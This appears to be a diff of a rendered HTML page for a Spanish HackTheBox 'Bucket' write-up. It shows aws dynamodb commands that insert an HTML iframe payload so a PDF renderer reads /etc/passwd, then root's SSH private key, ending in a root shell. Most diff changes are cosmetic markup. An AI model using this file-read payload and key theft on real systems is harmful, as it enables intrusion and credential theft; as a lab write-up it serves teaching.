 </span><span class="se"></span>	--item <span class="s1">&#39;{&#34;title&#34;: {&#34;S&#34;: &#34;Ransomware&#34;}, &#34;data&#34;: {&#34;S&#34;: &#34;&lt;html&gt;&lt;body&gt;&lt;iframe src=/etc/passwd width=1000 height=400 frameborder=0 &gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#34;} }&#39;</span>
 </code></pre></td></tr></table>
@@ -2586,7 +2586,7 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 </div><p>Copiamos los archivos que se encuentran en <code>/var/www/bucket-app/files/</code> a nuestra carpeta principal y luego a nuestra maquina, vemos que el archivo pdf logró realizar la lectura del archivo <code>/etc/passwd</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2610,7 +2610,7 @@ use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ pdftotext result.pdf result.txt
                                                                                                                                                                                               
 ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
@@ -2637,14 +2637,14 @@ pd4ml evaluation copy. visit http://pd4ml.com
 </div><p>Hay que mencionar que el anterior proceso se realizo de manera rapida y conjunta ya que existe un cron que restaura la carpeta y el bucket, además elimina los archivos creados en <code>/var/www/bucket-app/files/</code>, por lo que se utilizaron dos consolas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#CONSOLA 1</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#CONSOLA 1</span>
 aws dynamodb create-table --table-name alerts --attribute-definitions <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S --key-schema <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE --provisioned-throughput <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span><span class="m">5</span> --endpoint-url http://localhost:4566 <span class="o">&amp;&amp;</span> sleep <span class="m">1</span> <span class="o">&amp;&amp;</span> aws dynamodb put-item --table-name alerts --item <span class="s1">&#39;{&#34;title&#34;: {&#34;S&#34;: &#34;Ransomware&#34;}, &#34;data&#34;: {&#34;S&#34;: &#34;&lt;html&gt;&lt;body&gt;&lt;iframe src=/etc/passwd width=1000 height=400&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#34;} }&#39;</span> --endpoint-url http://localhost:4566
 
 <span class="c1">#CONSOLA 2</span>
@@ -2654,7 +2654,7 @@ aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566 <span
 </div><p>Utilizamos los mismos comandos pero esta vez para obtener la clave privada del usuario root que posiblemente se encuentra en <code>/root/.ssh/id_rsa</code>. Luego de obtener el pdf logramos leer la clave privada.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2672,7 +2672,7 @@ aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566 <span
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
 └─$ pdftotext it.pdf it.txt           
                                                                                                                                                                                               
 ┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/bucket<span class="o">]</span>
@@ -2693,7 +2693,7 @@ pd4ml evaluation copy. visit http://pd4ml.com
 </div><p>Utilizamos firefox para leer y guardar la clave ya que <code>pdftotext</code> no toma la clave privada entera, utilizamos esta ultima para obtener una shell root y nuestra flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2710,7 +2710,7 @@ pd4ml evaluation copy. visit http://pd4ml.com
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Last login: Tue Feb  <span class="m">9</span> 14:39:03 <span class="m">2021</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">Last login: Tue Feb  <span class="m">9</span> 14:39:03 <span class="m">2021</span>
 root@bucket:~# whoami<span class="p">;</span>id<span class="p">;</span>pwd<span class="p">;</span>hostname
 root
 <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
@@ -3006,7 +3006,7 @@ root@bucket:~#
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -4126,7 +4126,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#http">HTTP</a>
       <ul>
         <li><a href="#gobuster">GOBUSTER</a></li>
-        <li><a href="#aws-bucket">AWS BUCKET</a></li>
+        <li><a href="#aws-bucket-">AWS BUCKET</a></li>
       </ul>
     </li>
     <li><a href="#www-data---user">WWW-DATA - USER</a></li>
